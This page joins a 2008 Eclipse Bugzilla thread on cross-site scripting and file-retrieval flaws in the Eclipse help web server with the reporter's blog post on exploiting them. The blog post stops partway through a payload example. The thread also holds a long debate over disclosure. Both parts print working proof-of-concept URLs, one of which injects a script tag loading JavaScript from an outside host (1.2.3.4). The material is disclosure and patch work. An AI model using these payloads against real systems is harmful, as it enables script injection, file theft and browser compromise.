=== Content from bugs.eclipse.org_636bf6a6_20250125_054218.html ===


[![logo](https://www.eclipse.org/eclipse.org-common/themes/solstice/public/images/logo/eclipse-foundation-grey-orange.svg)](https://www.eclipse.org/)

* [Download](https://www.eclipse.org/downloads/)
* [Getting Started](https://www.eclipse.org/users/)
* [Members](https://www.eclipse.org/membership/)
* [Projects](https://www.eclipse.org/projects/)
* Community
  + [Marketplace](http://marketplace.eclipse.org)
  + [Events](http://events.eclipse.org)
  + [Planet Eclipse](http://www.planeteclipse.org/)
  + [Newsletter](https://www.eclipse.org/community/eclipse_newsletter/)
  + [Videos](https://www.youtube.com/user/EclipseFdn)
* Participate
  + [Report a Bug](https://bugs.eclipse.org/bugs/)
  + [Forums](https://www.eclipse.org/forums/)
  + [Mailing Lists](https://www.eclipse.org/mail/)
  + [Wiki](https://wiki.eclipse.org/)
  + [IRC](https://wiki.eclipse.org/IRC)
  + [How to Contribute](https://www.eclipse.org/contribute/)
* Working Groups
  + [Automotive](http://wiki.eclipse.org/Auto_IWG)
  + [Internet of Things](http://iot.eclipse.org)
  + [LocationTech](http://locationtech.org)
  + [Long-Term Support](http://lts.eclipse.org)
  + [PolarSys](http://polarsys.org)
  + [Science](http://science.eclipse.org)
  + [OpenMDM](http://www.openmdm.org)
* More
  + - **Community**
    - [Marketplace](http://marketplace.eclipse.org)
    - [Events](http://events.eclipse.org)
    - [Planet Eclipse](http://www.planeteclipse.org/)
    - [Newsletter](https://www.eclipse.org/community/eclipse_newsletter/)
    - [Videos](https://www.youtube.com/user/EclipseFdn)
    - **Participate**
    - [Report a Bug](https://bugs.eclipse.org/bugs/)
    - [Forums](https://www.eclipse.org/forums/)
    - [Mailing Lists](https://www.eclipse.org/mail/)
    - [Wiki](https://wiki.eclipse.org/)
    - [IRC](https://wiki.eclipse.org/IRC)
    - [How to Contribute](https://www.eclipse.org/contribute/)
    - **Working Groups**
    - [Automotive](http://wiki.eclipse.org/Auto_IWG)
    - [Internet of Things](http://iot.eclipse.org)
    - [LocationTech](http://locationtech.org)
    - [Long-Term Support](http://lts.eclipse.org)
    - [PolarSys](http://polarsys.org)
    - [Science](http://science.eclipse.org)
    - [OpenMDM](http://www.openmdm.org)

Toggle navigation

[![logo](/eclipse.org-common/themes/solstice/public/images/logo/eclipse-800x188.png)](https://www.eclipse.org/)

Bugzilla – Bug 223539
[Webapp][Security] Vulnerability discovered in Eclipse.
Last modified: 2019-11-14 03:08:17 EST

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [Log In](show_bug.cgi?id=223539&GoAheadAndLogIn=1)

  [x]
| * [Terms of Use](http://www.eclipse.org/legal/termsofuse.php)
| * [Copyright Agent](http://www.eclipse.org/legal/copyright.php)

This Bugzilla instance is deprecated, and most Eclipse projects now use
[GitHub](https://github.com/eclipse) or [Eclipse GitLab](https://gitlab.eclipse.org/eclipse/). Please see the [deprecation plan](https://gitlab.eclipse.org/eclipsefdn/helpdesk/-/wikis/Gerrit/Gerrit-and-Bugzilla-deprecation-and-migration-plan) for details.

[**Bug 223539**](show_bug.cgi?id=223539)
- [Webapp][Security] Vulnerability discovered in Eclipse.

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
[Webapp][Security] Vulnerability discovered in Eclipse.

| | [Status](page.cgi?id=fields.html#bug_status): | CLOSED WONTFIX | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Platform | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Eclipse Project | | [Component:](describecomponents.cgi?product=Platform "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | User Assistance ([show other bugs](buglist.cgi?component=User%20Assistance&product=Platform&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | 3.4   [Edit](https://dev.eclipse.org/committers/bugs/bugz_manager.php) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | PC Windows XP | |  | | | [Importance](page.cgi?id=fields.html#importance): | P3 normal ([vote](page.cgi?id=voting/user.html&bug_id=223539#vote_223539)) | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | ---   [Edit](https://dev.eclipse.org/committers/bugs/bugz_manager.php) | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | platform-ua-inbox [CLA](https://wiki.eclipse.org/ECA) | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | stalebug | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") | security | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2008-03-21 20:05 EDT by puhley [CLA](https://wiki.eclipse.org/ECA) | | --- | --- | | Modified: | 2019-11-14 03:08 EST ([History](show_activity.cgi?id=223539)) | | CC List: | 16 users (show)  b.muskalla cgold daniel\_megert denis.roy eclipse gunnar john.arthorne kleind mober.at+eclipse puhley rahulk remy.suen rob.carter simon\_kaegi wayne.beaton zhhaohh | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | | --- | --- | --- | | [Add an attachment](attachment.cgi?bugid=223539&action=enter) (proposed patch, testcase, etc.) | | |   | Note You need to [log in](show_bug.cgi?id=223539&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=223539#c0)  puhley [CLA](https://wiki.eclipse.org/ECA)    2008-03-21 20:05:24 EDT  ``` Build ID: 3.3.3.r33x_r20080129  Steps To Reproduce: Please contact directly for steps to reproduce.     More information: I am not including the steps to reproduce because this is a security related bug.  Since Eclipse.org does not appear to have a security@ email address or a way to mark a bug as security related (and therefore private), I am filing a generic bug in order to reach developers directly. ```  [Comment 1](show_bug.cgi?id=223539#c1)  Remy Suen [CLA](https://wiki.eclipse.org/ECA)    2008-03-21 20:51:52 EDT  ``` In the spirit of open source, should we not be public about this bug?  Also, you filed this under the 'Doc' component, maybe you could elaborate on the "positioning" of the problem? How does the bug affect/relate to the "documentation" of Eclipse? Or are you talking a vulnerability on the website? ```  [Comment 2](show_bug.cgi?id=223539#c2)  puhley [CLA](https://wiki.eclipse.org/ECA)    2008-03-21 21:05:58 EDT  ``` Typically, open-source groups will mark security bugs as private at least until a patch is available. You do not want to publish the details of an exploit until a patch is available for users.  Otherwise, everyone who uses Eclipse is exposed to the vulnerability without any means to protect themselves. ```  [Comment 3](show_bug.cgi?id=223539#c3)  Dani Megert [CLA](https://wiki.eclipse.org/ECA)    2008-03-22 02:54:53 EDT  ``` >In the spirit of open source, should we not be public about this bug? Sure, but adding the steps for the hack here so that everyone can see it would be a very bad idea ;-) On the other hand Eclipse is huge with many different responsible people, so a little hint which area / component is affected wouldn't hurt. Anyway, if you don't want to give more information here - which I can understand - then please send a private note to Deni's (denis.roy at eclipse.org). Most likely he can help you. If not, ping me directly. ```  [Comment 4](show_bug.cgi?id=223539#c4)  Denis Roy [CLA](https://wiki.eclipse.org/ECA)    2008-03-26 09:26:29 EDT  ``` This bug is now restricted to Eclipse committers. The reporter and the current CC list can also access this bug.  Feel free to discuss the details, add patches, etc.  Once the security issues no longer exist (i.e., a fix is been generally available) feel free to render the bug public.  I'm adding myself as cc, as I run help.eclipse.org which is likely affected by this. ```  [Comment 5](show_bug.cgi?id=223539#c5)  Martin Oberhuber [CLA](https://wiki.eclipse.org/ECA)    2008-03-26 10:35:05 EDT  ``` Running dsdp.eclipse.org which is probably also affected ```  [Comment 6](show_bug.cgi?id=223539#c6)  Rob Carter [CLA](https://wiki.eclipse.org/ECA)    2008-03-31 11:41:21 EDT  ``` If anyone needs further information about the bug please feel free to ask me. The initial email sent from Peleus to the Eclipse team contained my bug report that I sent to Adobe because I believed this was a Flex issue. Since this bug is now restricted I assume it's ok to post the details here. ```  [Comment 7](show_bug.cgi?id=223539#c7)  Denis Roy [CLA](https://wiki.eclipse.org/ECA)    2008-04-01 09:31:09 EDT  ``` (In reply to [comment #6](show_bug.cgi?id=223539#c6)) > Since this bug > is now restricted I assume it's ok to post the details here.  Yes, it is.  Please go ahead.   ```  [Comment 8](show_bug.cgi?id=223539#c8)  Rob Carter [CLA](https://wiki.eclipse.org/ECA)    2008-04-04 23:02:41 EDT  ``` (In reply to [comment #7](show_bug.cgi?id=223539#c7)) > (In reply to [comment #6](show_bug.cgi?id=223539#c6)) > > Since this bug > > is now restricted I assume it's ok to post the details here. > Yes, it is.  Please go ahead.  Hi all,  Sorry for the delay in reply to this bug. I'll blame that on the amount of travel I've been doing lately. Here is the important stuff from the email I sent to Peleus:  I discovered that when the "Help Contents" are viewed (Help -> Help Contents) a web server is started up on the local machine. Upon further investigation I discovered that this server is an Apache Coyote 1.1 web server. I found 3 separate flaws in the Flex Help web application that is run on this web server.  Reflected XSS: The search JSP script at <http://127.0.0.1:port/help/advanced/searchView.jsp> is vulnerable to XSS through the following parameter:  <http://127.0.0.1:port/help/advanced/searchView.jsp?searchWord=a>");}alert('xss');</script>  This is very dangerous due to the fact that the web server is being run on the local machine. It is possible to perform Cross-Zone Scripting in Internet Explorer by inserting malicious Javascript code into a page being run from a local web server, if that page is being accessed from the same machine. The IP address 127.0.0.1 is in the Internet zone, but the hostname "localhost" is in the Local Intranet zone, which has far fewer restrictions. If an attacker can exploit this cross-zone scripting flaw they would be able to circumvent the same-origin policy (IE 6 & 7), read and write arbitrary files on the local system (IE 6) and even execute arbitrary commands on the operating system (IE 6), all through ActiveX objects.   Persistent XSS: The "New Search List" functionality in the Help web application is vulnerable to a persistent XSS through the following parameter:  <http://127.0.0.1:port/help/advanced/workingSetManager.jsp?operation=add&workingSet='%3E%3Cscript%20src%3D'http%3A%2F%2F1.2.3.4%2Fa.js'%3E%3C%2Fscript%3E&hrefs=%2Fcom.adobe.flexbuilder.help.api%2Ftoc.xml&oldName>=  This will store the text of my new "workingSet" as '><script src='<http://1.2.3.4/a.js>'></script> which breaks out of the "a" tag and loads a malicious Javascript file from the server at 1.2.3.4. When Flex Builder is closed, reopened and the Help web application restarted, that XSS is still present, making it a persistent XSS vector. I haven't yet done any research into where this information is stored on the system.  As with the previous XSS, this attack vector can be used to perform Cross-Zone Scripting attacks circumventing the same-origin policy, reading and writing files on the local system and executing arbitrary commands on the operating system since the malicious script would be running from the Local Intranet zone.   Jar and Zip Resource Retrieval in Plugins Directory: The /help/index.jsp file accepts a topic parameter that defines the help topic to display in the web application. The default form of the URL is as follows:  <http://127.0.0.1:port/help/index.jsp?topic=/com.adobe.flexbuilder.help/html/some_help_page.html>  I discovered that there is a zip file in the C:\Program Files\Adobe\Flex Builder 2\plugins\com.adobe.flexbuilder.help folder called doc.zip that contains all the help documentation. Through further experimentation I found that any resource could be pulled out of any jar or zip file contained in the plugins folder.  <http://127.0.0.1:port/help/index.jsp?topic=/org.eclipse.core.commands/plugin.properties>  The above URL will retrieve the plugin.properties file in the C:\Program Files\Adobe\Flex Builder 2\plugins\org.eclipse.core.commands_3.1.0.jar file.   If you have any questions about what I've outlined above feel free to let me know. ```  [Comment 9](show_bug.cgi?id=223539#c9)  Denis Roy [CLA](https://wiki.eclipse.org/ECA)    2008-04-14 09:32:28 EDT  ``` > Reflected XSS: > The search JSP script at <http://127.0.0.1:port/help/advanced/searchView.jsp> is > vulnerable to XSS through the following parameter: > <http://127.0.0.1:port/help/advanced/searchView.jsp?searchWord=a>");}alert('xss');</script>  I was able to reproduce this on help.eclipse.org using a non-Firefox browser only. Firefox always encodes the " which makes it unusable.  Tested with MSIE and Konqueror: <http://help.eclipse.org/help33/advanced/searchView.jsp?searchWord=a>");}alert('xss');</script>  I've tracked this down to line 44 of this file, which doesn't seem to filter the http request: <http://dev.eclipse.org/viewcvs/index.cgi/org.eclipse.help.webapp/advanced/searchView.jsp?view=annotate>  > Persistent XSS: > The "New Search List" functionality in the Help web application is vulnerable > to a persistent XSS through the following parameter: > <http://127.0.0.1:port/help/advanced/workingSetManager.jsp?operation=add&workingSet='%3E%3Cscript%20src%3D'http%3A%2F%2F1.2.3.4%2Fa.js'%3E%3C%2Fscript%3E&hrefs=%2Fcom.adobe.flexbuilder.help.api%2Ftoc.xml&oldName>= >  > This will store the text of my new "workingSet" as '><script > src='<http://1.2.3.4/a.js>'></script> which breaks out of the "a" tag and loads a > malicious Javascript file from the server at 1.2.3.4.   Indeed, the resulting HTML looks like this: <tr class='list' id='r0' style="width:100%;"> 	<td align='left' class='label' nowrap style="width:100%; padding-left:5px;"> 		<a id='a0'  		   href='#'  		   onclick="active=this;highlightHandler()"    		   ondblclick="selectWorkingSet()" 		   title="'><script src='<http://1.2.3.4/a.js>'></script>"> 		   '><script src='<http://1.2.3.4/a.js>'></script> 		 </a>  	</td> </tr>  Line 295 of this file seems to indicate that there is no filtering of input text: <http://dev.eclipse.org/viewcvs/index.cgi/org.eclipse.help.webapp/advanced/workingSetManager.jsp?annotate=1.59>  If someone points me to the right filter to use, I'll gladly play developer and submit a patch  :)   > Jar and Zip Resource Retrieval in Plugins Directory: <http://127.0.0.1:port/help/index.jsp?topic=/org.eclipse.core.commands/plugin.properties> >  > The above URL will retrieve the plugin.properties file in the C:\Program > Files\Adobe\Flex Builder 2\plugins\org.eclipse.core.commands_3.1.0.jar file.  I've reproduced that here:  <http://help.eclipse.org/help33/index.jsp?topic=/org.eclipse.core.commands/plugin.properties> <http://help.eclipse.org/help33/topic/org.eclipse.core.commands/plugin.properties>  This could be a simple web server setting.  I haven't tried to track this down, but I (as the site admin) could easily bypass this using Apache -- but the "built-in" web server (Coyote/Jetty/Tomcatetc) should be configured to only serve up known-good files.  From here, I think the severity of this should be increased.  Eclipse.org, and every other site hosting an Infocenter, now has security vulnerabilities.  Also, I've moved this to platform-ua.. Correct me is I'm wrong. ```  [Comment 10](show_bug.cgi?id=223539#c10)  Chris Goldthorpe [CLA](https://wiki.eclipse.org/ECA)    2008-04-14 11:57:11 EDT  ``` Targeting Eclipse 3.4 ```  [Comment 11](show_bug.cgi?id=223539#c11)  puhley [CLA](https://wiki.eclipse.org/ECA)    2008-04-17 00:19:36 EDT  ``` Can we change the Reporter on this issue to Rob Carter (rob.carter@ey.com)?  I would still like to be on the CC list.  However, it was Rob's find and he should be given the credit.  Thx. ```  [Comment 12](show_bug.cgi?id=223539#c12)  Chris Goldthorpe [CLA](https://wiki.eclipse.org/ECA)    2008-04-24 12:20:40 EDT  ``` There are two other bugs relating to security which I have fixed recently:  [Bug 223363](show_bug.cgi?id=223363 "RESOLVED FIXED - [Webapp][Security] Cross site scripting vulnerabilities in confirm.jsp and deferredView.jsp") identified a few vulnerabilities - after fixing this bug I decided to review all of the jsps in the help system for places where unescaped parameters could get inserted into the jsps. I found a few of these and fixed them, see [Bug 223980](show_bug.cgi?id=223980 "RESOLVED FIXED - [Webapp][Security] Unencoded strings inserted into JavaScript"). As a result of fixing these two bugs the security vulnerabilities described in this bug report which allow script insertion into jsp files have been fixed.   This still leaves the issue of being able to access any files in the plugin directories using the topic= parameter. I had not really considered this to be a vulnerability but I can see that it is an unexpected feature. I see this as being far less serious than the parameter copying problems.  Since the highest priority issues have been fixed and the only problem still open is with misuse of topic= I am lowering the priority to P3 and removing the target milestone.  ```  [Comment 13](show_bug.cgi?id=223539#c13)  Rob Carter [CLA](https://wiki.eclipse.org/ECA)    2008-04-24 12:27:35 EDT  ``` (In reply to [comment #12](show_bug.cgi?id=223539#c12)) > There are two other bugs relating to security which I have fixed recently: > ...  > Since the highest priority issues have been fixed and the only problem still > open is with misuse of topic= I am lowering the priority to P3 and removing the > target milestone.  >   When are the fixes for the XSS vulnerabilities going to be released to the general public? ```  [Comment 14](show_bug.cgi?id=223539#c14)  Chris Goldthorpe [CLA](https://wiki.eclipse.org/ECA)    2008-04-24 12:38:56 EDT  ``` The fixes for the XSS bugs are available now. [Bug 223363](show_bug.cgi?id=223363 "RESOLVED FIXED - [Webapp][Security] Cross site scripting vulnerabilities in confirm.jsp and deferredView.jsp") and [Bug 223980](show_bug.cgi?id=223980 "RESOLVED FIXED - [Webapp][Security] Unencoded strings inserted into JavaScript") both have patches attached. Also the fixes will start appearing in Eclipse builds, any 3.4 builds after today will contain these fixes. ```  [Comment 15](show_bug.cgi?id=223539#c15)  Denis Roy [CLA](https://wiki.eclipse.org/ECA)    2008-11-03 16:47:47 EST  ``` As everything has been fixed for several months, I believe we can safely remove the committer-only restriction on this bug.  Am I mistaken? ```  [Comment 16](show_bug.cgi?id=223539#c16)  Chris Goldthorpe [CLA](https://wiki.eclipse.org/ECA)    2008-11-03 17:15:53 EST  ``` All but one of the issues have been addressed. Since that is still open we should keep the flag on. ```  [Comment 17](show_bug.cgi?id=223539#c17)  Denis Roy [CLA](https://wiki.eclipse.org/ECA)    2010-07-20 22:39:39 EDT  ``` > All but one of the issues have been addressed. Since that is still open we > should keep the flag on.  I've lost track -- have all the issues been addressed? ```  [Comment 18](show_bug.cgi?id=223539#c18)  Dani Megert [CLA](https://wiki.eclipse.org/ECA)    2010-07-21 02:17:01 EDT  ``` >I've lost track -- have all the issues been addressed? Even if all issues were solved we must not open access on this bug since older Eclipse versions are still used out there and there's really not benefit in opening the access. ```  [Comment 19](show_bug.cgi?id=223539#c19)  Gunnar Wagenknecht [CLA](https://wiki.eclipse.org/ECA)    2010-07-21 02:38:50 EDT  ``` (In reply to [comment #18](show_bug.cgi?id=223539#c18)) > Even if all issues were solved we must not open access on this bug since older > Eclipse versions are still used out there and there's really not benefit in > opening the access.  In my opinion, informing users about security issues in their software is a huge benefit. If the message can delivered together with "fixed in ..." than the benefit is even larger. ```  [Comment 20](show_bug.cgi?id=223539#c20)  Dani Megert [CLA](https://wiki.eclipse.org/ECA)    2010-07-21 02:50:53 EDT  ``` >In my opinion, informing users about security issues Sure, but you don't point them to an exact description of the problem. That would be very stupid. ```  [Comment 21](show_bug.cgi?id=223539#c21)  Gunnar Wagenknecht [CLA](https://wiki.eclipse.org/ECA)    2010-07-21 03:06:44 EDT  ``` (In reply to [comment #20](show_bug.cgi?id=223539#c20)) > >In my opinion, informing users about security issues > Sure, but you don't point them to an exact description of the problem.   I see at least a few other bugs mentioned in comments here. They just need to be added to "depends on" section. Users aren't stupid. They will find them.  Please don't forget the reaction of users if they find out that we hide information from them. ```  [Comment 22](show_bug.cgi?id=223539#c22)  Dani Megert [CLA](https://wiki.eclipse.org/ECA)    2010-07-21 03:22:32 EDT  ``` >Please don't forget the reaction of users if they find out that we hide >information from them. Sure, especially those who are looking for such information to hack the system ;-).  If we'd follow blindly the principle to not hide the information then we can remove the restricted group feature in the first place. But obviously I have a different opinion on that. ```  [Comment 23](show_bug.cgi?id=223539#c23)  Gunnar Wagenknecht [CLA](https://wiki.eclipse.org/ECA)    2010-07-21 03:42:46 EDT  ``` (In reply to [comment #22](show_bug.cgi?id=223539#c22)) > >Please don't forget the reaction of users if they find out that we hide > >information from them. > Sure, especially those who are looking for such information to hack the system > ;-).  Somebody who wants to hack a system does need this information. They'll find out by themselves. Very often, hackers explicitly use non-disclosed vulnerabilities. Some of those vulnerabilities might have been known by developers for a long time. They were just never disclosed to users. Thus, users felt save and did not upgrade. That's a major weakness of security through obscurity.   > If we'd follow blindly the principle to not hide the information then we can > remove the restricted group feature in the first place. But obviously I have a > different opinion on that.  Well, obviously I'm not a fan of the security through obscurity approach. But I strongly disagree with your "blindly" argument here. The issue was discovers, fixes were prepared and released. The last missing piece in the process is the disclosure of the vulnerability. That's a very common and essential piece in processes around application security. Usually it goes together with a security advisory sent out through public channels to make uses explicitly aware of any vulnerability and recommended actions they need to take (eg. update). ```  [Comment 24](show_bug.cgi?id=223539#c24)  Denis Roy [CLA](https://wiki.eclipse.org/ECA)    2010-07-21 08:57:28 EDT  ``` I agree with Gunnar. The XSS vulnerability is out there in the large now, and simply hiding information we know does not mean no one else knows, and thus does not make our users (and the users of our software) more secure. Now that a fix is available, the proper process would be to announce (on eclipse-dev, for instance) that a vulnerability exists in older versions and that an upgrade is highly recommended.  This is typically how it's done.  From there, users/sysadmins can evaluate the risk of upgrading vs. the risk of staying the course.  Here is how Bugzilla typically announces a security vulnerability:  <http://www.bugzilla.org/security/2.20.4/>  The whole idea of hiding information is to prevent abuse while there is no available fix.  Nothing more. ```  [Comment 25](show_bug.cgi?id=223539#c25)  Chris Goldthorpe [CLA](https://wiki.eclipse.org/ECA)    2010-07-21 16:13:50 EDT  ``` This bug report covered more than one bug. There is one problem remaining but I agree that the part which was fixed back in Eclipse 3.4 should be made public. If non-one objects I will create a non restricted clone of this bug report describing the scenarios that have been fixed and close it as WORKSFORME. ```  [Comment 26](show_bug.cgi?id=223539#c26)  Wayne Beaton [CLA](https://wiki.eclipse.org/ECA)    2012-01-13 11:57:25 EST  ``` What is our status here? Is it time to turn off the committer-only checkbox? ```  [Comment 27](show_bug.cgi?id=223539#c27)  Wayne Beaton [CLA](https://wiki.eclipse.org/ECA)    2012-02-05 13:33:01 EST  ``` (In reply to [comment #26](show_bug.cgi?id=223539#c26)) > What is our status here? Is it time to turn off the committer-only checkbox?  Ping? ```  [Comment 28](show_bug.cgi?id=223539#c28)  Chris Goldthorpe [CLA](https://wiki.eclipse.org/ECA)    2012-02-06 17:59:38 EST  ``` Yes, it is time to remove the committer-only flag. ```  [Comment 29](show_bug.cgi?id=223539#c29)  Wayne Beaton [CLA](https://wiki.eclipse.org/ECA)    2012-02-06 19:55:00 EST  ``` Should this be marked FIXED? ```  [Comment 30](show_bug.cgi?id=223539#c30)  Lars Vogel [CLA](https://wiki.eclipse.org/ECA)    2019-11-14 03:08:17 EST  ``` This bug hasn't had any activity in quite some time. Maybe the problem got resolved, was a duplicate of something else, or became less pressing for some reason - or maybe it's still relevant but just hasn't been looked at yet.  If you have further information on the current state of the bug, please add it. The information can be, for example, that the problem still occurs, that you still want the feature, that more information is needed, or that the bug is (for whatever reason) no longer relevant.  If the bug is still relevant, please remove the "stalebug" whiteboard tag. ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=223539)
* - [XML](show_bug.cgi?ctype=xml&id=223539)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=223539)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [Log In](show_bug.cgi?id=223539&GoAheadAndLogIn=1)

    [x]
  | + [Terms of Use](http://www.eclipse.org/legal/termsofuse.php)
  | + [Copyright Agent](http://www.eclipse.org/legal/copyright.php)



=== Content from r00tin.blogspot.com_f50067d6_20250125_054217.html ===


# [Farfromr00tin](http://r00tin.blogspot.com/)

## About Me

**Name:**  [Rob](https://www.blogger.com/profile/15811656706735141330)
**Location:** United States

[View my complete profile](https://www.blogger.com/profile/15811656706735141330)

## Previous Posts

* [toorcon Seattle was Awesome](http://r00tin.blogspot.com/2008/04/toorcon-seattle-was-awesome.html)
* [uTorrent Pwn3d](http://r00tin.blogspot.com/2008/04/utorrent-pwn3d.html)
* [toorcon Seattle](http://r00tin.blogspot.com/2008/04/t00rcon-seattle.html)
* [Attack 0f T3h D0wd](http://r00tin.blogspot.com/2008/04/attack-0f-t3h-d0wd.html)
* [Flash DNS Rebinding Attack Explained](http://r00tin.blogspot.com/2008/04/flash-dns-rebinding-attack-explained.html)
* [Flash DNS Rebinding Flaw Fixed](http://r00tin.blogspot.com/2008/04/flash-dns-rebinding-fixed.html)
* [More On Local Web Servers](http://r00tin.blogspot.com/2008/04/more-on-local-web-servers.html)
* [I Survived!](http://r00tin.blogspot.com/2008/03/i-survived.html)
* [Black Hat Europe](http://r00tin.blogspot.com/2008/03/black-hat-europe.html)
* [Local Web Servers Are Dangerous](http://r00tin.blogspot.com/2008/03/local-web-servers-are-dangerous.html)

[![Powered by Blogger](http://buttons.blogger.com/bloggerbutton1.gif)](http://www.blogger.com)

## Thursday, April 24, 2008

[### [ Eclipse Local Web Server Exploitation ]](http://r00tin.blogspot.com/2008/04/eclipse-local-web-server-exploitation.html)

I'm starting to feel a bit redundant here...

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhWWK3q1FpYzH4xeg2g6_bh0AJ7t0kBc1SPgzplgTj7a-2ZNN4iOvEtc0M_Fk_n1osEsI4HxRb7JbEfJTqVoyXuN9HObq3uo6u1I8k6zSza1arWKHi52DOBm8hQaLhZp4qtb8ltQ/s200/96-t256.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhWWK3q1FpYzH4xeg2g6_bh0AJ7t0kBc1SPgzplgTj7a-2ZNN4iOvEtc0M_Fk_n1osEsI4HxRb7JbEfJTqVoyXuN9HObq3uo6u1I8k6zSza1arWKHi52DOBm8hQaLhZp4qtb8ltQ/s1600-h/96-t256.png)
Oh well. I've been told that there is a patch available now for this issue so I'm free to talk about it.

I discovered [XSS vulnerabilities](https://bugs.eclipse.org/bugs/show_bug.cgi?id=223539) in the [Eclipse](http://www.eclipse.org) help system. Apparently just about all products based on Eclipse are/were vulnerable.

Since the vulnerability is XSS in a locally running web server (hrm, [where](http://xs-sniper.com/blog/Picasa-URI/) [have](http://r00tin.blogspot.com/2008/03/local-web-servers-are-dangerous.html) [we](http://r00tin.blogspot.com/2008/04/more-on-local-web-servers.html) [heard](http://r00tin.blogspot.com/2008/04/utorrent-pwn3d.html) that before...) if the user is running IE they may be in trouble.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiogpssPZ0NT62TPlDGPD6wz17qR1Uvj7Rjk-SpKyzXOzOlPu8I2coGaKZlj_vcAmsReZoO_yi39kfuNlIT4xThDVs-YqJucJKAiFO6_828Rad0bdbu5LaWejC-GdyDMq94ciJ_iA/s200/local_intranet.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiogpssPZ0NT62TPlDGPD6wz17qR1Uvj7Rjk-SpKyzXOzOlPu8I2coGaKZlj_vcAmsReZoO_yi39kfuNlIT4xThDVs-YqJucJKAiFO6_828Rad0bdbu5LaWejC-GdyDMq94ciJ_iA/s1600-h/local_intranet.png)
When you click on Help -> Help Contents a web server is started up on the local machine. Upon further investigation I discovered that this server is an Apache Coyote 1.1 web server. The web server seems to be started on a pseudo-random port but it felt like a lot of the port numbers were used quite frequently. I never performed any kind of analysis on the random number generation for the port number so I'll leave that to someone else if they want to.

Anyway, let's get to the pwnage. Here's the location of the reflected XSS in the Eclipse Help System:

http://localhost:port/help/advanced/searchView.jsp?searchWord=a");}alert('xss');
</script>
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9MO4yqaKhlx1_Ucqd0ms2TUNq2NW9LIw7XSSW8AUHJ0gxTt-RJUHYBENqoR6B82J1A7cKL5c6d9ECog-9G68Ii88vzfxtEQh3p2-BQ7UQhV4GSlaiDl-D6QytfshMfAULf903tw/s200/xss_help_1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9MO4yqaKhlx1_Ucqd0ms2TUNq2NW9LIw7XSSW8AUHJ0gxTt-RJUHYBENqoR6B82J1A7cKL5c6d9ECog-9G68Ii88vzfxtEQh3p2-BQ7UQhV4GSlaiDl-D6QytfshMfAULf903tw/s1600-h/xss_help_1.png)
Here's the location of the persistent XSS:

http://localhost:port/help/advanced/workingSetManager.jsp?operation=add&
workingSet='%3E%3Cscript%20src%3D'http%3A%2F%2F1.2.3.4%2Fa.js'%3E%3C%2Fscript%3E
&hrefs=%2Fcom.adobe.flexbuilder.help.api%2Ftoc.xml&oldName=
One thing I did find particularly interesting was trying to work around the fact that when I exploited the reflective XSS the web app did not change %20's back into spaces. It took a little thinking to get around this, but I managed.

So how does one write a Javascript payload with no spaces? Pretty simply actually. Let's take this snippet of sample code that we want to use for our payload:

function f(){
